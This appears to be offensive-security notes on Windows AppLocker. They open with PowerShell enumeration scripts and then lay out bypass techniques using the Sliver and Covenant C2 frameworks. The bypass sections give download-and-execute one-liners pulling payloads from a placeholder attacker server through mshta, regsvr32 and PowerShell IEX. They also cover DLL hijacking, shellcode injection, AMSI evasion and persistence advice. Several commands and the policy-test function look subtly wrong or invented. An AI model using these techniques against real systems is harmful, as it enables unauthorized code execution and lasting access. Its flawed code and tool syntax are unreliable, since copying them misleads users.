
### Query Windows Event Logs 8004 and 8007

```powershell
# Define the event log path for AppLocker
$logPath = "Microsoft-Windows-AppLocker/EXE and DLL"

# Define the event IDs to look for (8004 for blocked EXE and DLL, 8007 for script rules)
$eventIDs = @(8004, 8007)

# Get the events from the specified log and event IDs
$blockedEvents = Get-WinEvent -LogName $logPath -FilterHashtable @{Id=$eventIDs} -ErrorAction SilentlyContinue

# Process and output the blocked events
foreach ($event in $blockedEvents) {
    $timeCreated = $event.TimeCreated
    $message = $event.Message
    $user = $event.Properties[1].Value # The user context the event was logged under
    $fileName = $event.Properties[6].Value # The name of the blocked file

    Write-Output "Time: $timeCreated"
    Write-Output "User: $user"
    Write-Output "Blocked File: $fileName"
    Write-Output "Message: $message"
    Write-Output "---------------------------------------"
}

```


### Query Applocker Policies Directly

```powershell
# Define the function to check if an application is allowed by AppLocker
function Test-AppLockerPolicy {
    param (
        [string]$filePath
    )

    # Get the AppLocker policies for EXE, DLL, and Script
    $applockerPolicies = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue

    if ($null -eq $applockerPolicies) {
        Write-Output "No AppLocker policies found or access denied."
        return
    }

    # Create a new object for the test file
    $fileObject = New-Object -TypeName PSObject -Property @{
        Path = $filePath
        Publisher = $null
        ProductName = $null
        Description = $null
        FileName = [System.IO.Path]::GetFileName($filePath)
        InternalName = $null
        OriginalFileName = $null
        FileVersion = $null
        Language = $null
        MD5 = $null
        SHA1 = $null
        SHA256 = $null
        IsSigned = $false
    }

    # Check if the file is allowed by AppLocker
    $result = Test-AppLockerPolicy -Path $filePath -User "Everyone"

    if ($result.Allowed) {
        Write-Output "Allowed: $filePath"
    } else {
        Write-Output "Blocked: $filePath"
    }
}

# Example file paths to test
$filePaths = @(
    "C:\Path\To\Application1.exe",
    "C:\Path\To\Application2.exe",
    "C:\Path\To\Application3.exe"
)

# Test each file against the AppLocker policy
foreach ($filePath in $filePaths) {
    Test-AppLockerPolicy -filePath $filePath
}

```

### Find Directories in C:\\Windows that have writeable and executable permissions

```powershell
$windowsPath = "C:\Windows"
$writableExecutableDirectories = @()

# Function to check if a directory has writable and executable permissions
function IsWritableExecutable {
    param (
        [string]$path
    )

    try {
        # Get the ACL for the directory
        $acl = Get-Acl -Path $path
        $accessRules = $acl.Access

        $hasWritePermission = $false
        $hasExecutePermission = $false

        foreach ($rule in $accessRules) {
            # Check if the rule allows write access
            if ($rule.AccessControlType -eq "Allow" -and ($rule.FileSystemRights -band "Write") -ne 0) {
                $hasWritePermission = $true
            }

            # Check if the rule allows execute access
            if ($rule.AccessControlType -eq "Allow" -and ($rule.FileSystemRights -band "ExecuteFile") -ne 0) {
                $hasExecutePermission = $true
            }

            # Exit early if both permissions are found
            if ($hasWritePermission -and $hasExecutePermission) {
                return $true
            }
        }
    } catch {
        Write-Error "Error accessing ACL for ${path}: $_"
    }

    return $false
}

# Get all directories inside C:\Windows
$directories = Get-ChildItem -Path $windowsPath -Directory -Recurse -ErrorAction SilentlyContinue

foreach ($directory in $directories) {
    if (IsWritableExecutable -path $directory.FullName) {
        $writableExecutableDirectories += $directory.FullName
    }
}

# Output writable and executable directories
if ($writableExecutableDirectories.Count -gt 0) {
    Write-Host "Writable and executable directories inside ${windowsPath}:"
    $writableExecutableDirectories | ForEach-Object { Write-Host $_ }
} else {
    Write-Host "No writable and executable directories found inside $windowsPath."
}
```

## Bypass with Sliver

Sliver is a C2 framework similar to Covenant, and it also provides various techniques to bypass security controls like AppLocker. Here's how you might approach bypassing AppLocker using Sliver:

### Bypassing AppLocker with Sliver

#### 1. **Using Trusted Binaries (Living Off The Land)**
   - **How It Works**: Similar to Covenant, Sliver can use trusted binaries that are likely to be allowed by AppLocker. These binaries can be used to execute malicious payloads.
   - **Execution**: Utilize `mshta.exe`, `regsvr32.exe`, `rundll32.exe`, or other trusted binaries to execute payloads delivered by Sliver.
   - **Example**:
     ```bash
     mshta http://<your_server>/malicious.hta
     ```

#### 2. **Reflective DLL Injection**
   - **How It Works**: Sliver supports reflective DLL injection, where a DLL is injected into the memory of a process without touching the disk. This can bypass AppLocker because it avoids writing executable files to disk.
   - **Execution**: Inject a malicious DLL into a trusted process that is not restricted by AppLocker.
   - **Example**:
     ```bash
     use reflectivedll --dll /path/to/malicious.dll
     ```

#### 3. **Shellcode Injection**
   - **How It Works**: Sliver can generate shellcode that can be injected into a running process. Since this method doesn't require a file on disk, it can bypass AppLocker.
   - **Execution**: Generate shellcode with Sliver and inject it into a trusted process.
   - **Example**:
     ```bash
     use shellcode --payload windows/exec --command "cmd.exe /c calc.exe"
     ```
     Inject the generated shellcode into a process:
     ```bash
     inject --pid <PID> --shellcode /path/to/shellcode.bin
     ```

#### 4. **PowerShell Downgrade Attack**
   - **How It Works**: If PowerShell is running in Constrained Language Mode, you can use a PowerShell downgrade attack to force it into Full Language Mode, bypassing AppLocker restrictions.
   - **Execution**: Use Sliver to execute PowerShell commands that downgrade the PowerShell version to one that doesn't enforce AppLocker rules.
   - **Example**:
     ```bash
     powershell -version 2.0
     ```

#### 5. **Custom Loader**
   - **How It Works**: Sliver allows you to create custom loaders that can bypass AppLocker by using non-standard execution methods. These loaders can be designed to mimic trusted binaries or use less common execution paths.
   - **Execution**: Create a custom loader with Sliver and deploy it on the target system.
   - **Example**:
     ```bash
     generate --mtls --http --custom-loader /path/to/loader
     ```

#### 6. **AMSI Bypass**
   - **How It Works**: Sliver includes techniques to bypass AMSI (Antimalware Scan Interface), which can help in bypassing AppLocker by executing scripts that would otherwise be blocked.
   - **Execution**: Use AMSI bypass techniques before executing a payload that may be flagged by AMSI.
   - **Example**:
     ```powershell
     powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<your_server>/payload.ps1')"
     ```

#### 7. **Using C# and .NET Payloads**
   - **How It Works**: Sliver can generate C# payloads that can be executed via trusted .NET binaries like `InstallUtil.exe`, `RegAsm.exe`, or `MSBuild.exe`. These are often allowed by AppLocker.
   - **Execution**: Generate a C# payload with Sliver and execute it using a trusted .NET binary.
   - **Example**:
     ```bash
     use csharp --payload windows/exec --command "cmd.exe /c calc.exe"
     ```

### General Steps to Use Sliver for AppLocker Bypass

1. **Deploy Sliver Implant**: Get your Sliver implant on the target system.
2. **Choose Bypass Technique**: Select the appropriate bypass technique based on the environment.
3. **Execute Payload**: Deploy your payload using the selected technique.
4. **Maintain Access**: Once AppLocker is bypassed, consider setting up persistence mechanisms to retain access.

### Considerations

- **Detection**: As with any bypass technique, these methods can still be detected by advanced EDR solutions or monitored logs.
- **Testing**: Test in a controlled environment to understand the behavior of AppLocker and how the chosen technique interacts with it.

Sliver provides flexible and powerful tools that, when used creatively, can effectively bypass AppLocker, allowing for payload execution and persistence in restricted environments.


## Bypass with Convenant Grunt

Bypassing AppLocker using a Covenant Grunt typically involves using known techniques to circumvent the restrictions imposed by AppLocker policies. AppLocker is a Windows feature that allows administrators to control which executables, scripts, and other files users can run. However, certain techniques can be used to bypass these restrictions.

### Bypassing AppLocker with Covenant Grunt

Here are a few techniques that could be used to bypass AppLocker when operating within the Covenant C2 framework:

#### 1. **DLL Hijacking**
   - **How It Works**: This technique involves placing a malicious DLL in a location where a trusted application loads DLLs. When the application runs, it loads the malicious DLL instead of the legitimate one.
   - **Execution**: If you can drop a DLL in a writable directory where a trusted application is likely to load it, the Covenant Grunt can exploit this to gain execution.
   - **Example**:
     - Drop a malicious DLL in a directory with weak permissions.
     - Execute a trusted binary (e.g., a signed Microsoft binary) that loads the malicious DLL.

#### 2. **Regsvr32 (COM Scriptlets)**
   - **How It Works**: `Regsvr32.exe` can be used to execute COM scriptlets (SCT files) remotely or locally. This tool is often allowed by AppLocker because it is a legitimate Windows binary.
   - **Execution**: Covenant Grunt can use `regsvr32` to execute a payload without writing to disk.
   - **Example**:
```powershell
regsvr32 /s /n /u /i:http://<your_server>/malicious.sct scrobj.dll
```

#### 3. **MSHTA (Microsoft HTML Application)**
   - **How It Works**: `mshta.exe` is a legitimate Windows binary that can execute HTML applications (HTA files). Since it's a trusted binary, it may not be restricted by AppLocker.
   - **Execution**: Use `mshta.exe` to download and execute an HTA file that contains your Covenant payload.
   - **Example**:
     ```powershell
mshta http://<your_server>/malicious.hta
     ```

#### 4. **InstallUtil**
   - **How It Works**: `InstallUtil.exe` is a .NET framework binary used to install and uninstall server resources. It can be abused to execute arbitrary code via specially crafted assemblies.
   - **Execution**: Covenant Grunt can use this binary to run a malicious payload.
   - **Example**:
     ```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U /C:\path\to\malicious.exe
     ```

#### 5. **PowerShell Constrained Language Mode Bypass**
   - **How It Works**: In environments where PowerShell is restricted, but a Covenant Grunt has access, bypassing constrained language mode can allow for more complex PowerShell payloads.
   - **Execution**: Covenant may attempt to escape constrained language mode or use other Windows binaries to run PowerShell scripts outside of AppLocker's control.
   - **Example**:
     - Use `cmd.exe` to launch PowerShell with a trusted parent process.
     - Use a `C#` payload instead of direct PowerShell execution.

#### 6. **WMI (Windows Management Instrumentation)**
   - **How It Works**: WMI can be used to execute code on the system, often bypassing AppLocker due to its deep integration with the operating system.
   - **Execution**: A Grunt can leverage WMI to execute commands or scripts that are typically restricted.
   - **Example**:
     ```powershell
     wmiprvse.exe process call create "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://<your_server>/payload.ps1')"
     ```

### General Steps to Use Covenant for AppLocker Bypass

1. **Deploy Covenant Grunt**: Deploy your Covenant Grunt on the target system.
2. **Use Bypass Techniques**: Use one of the bypass techniques described above to execute your payload.
3. **Payload Execution**: The payload can be a simple command, a script, or an executable that the Covenant Grunt will deliver to the target.
4. **Maintain Persistence**: After bypassing AppLocker, consider using techniques to maintain persistence, such as creating scheduled tasks or using startup folders.

### Considerations

- **Detection**: While these methods can bypass AppLocker, they may still trigger alerts from antivirus or EDR solutions. Always test in a controlled environment.
- **AppLocker Rules**: Ensure you understand the specific AppLocker rules in place, as different environments may have different configurations.
